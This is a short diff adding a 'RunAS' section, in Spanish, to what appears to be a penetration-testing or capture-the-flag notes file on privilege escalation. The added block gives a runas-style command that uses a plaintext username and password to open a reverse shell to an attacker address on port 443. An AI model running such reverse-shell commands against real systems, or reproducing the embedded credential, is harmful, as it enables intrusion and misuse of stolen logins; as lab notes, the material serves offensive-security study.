@@ -4890,6 +4890,15 @@ permit nopass player as root cmd /usr/bin/dstat
 ```
 Ya de ahi buscate la escalacion pertinente pero asi es.
 
+## RunAS
+
+Este es un programa como el runas del mismo windows pero abierto usalo para una vez que tengas credencuales te armes una shell.
+
+```
+.\r.exe C.Bum Tikkycoll_431012284 -r 10.10.14.140:443 cmd
+```
+
+
 # Priv Escalation  ARENA
 
 ----------------------------------------------------------------------------
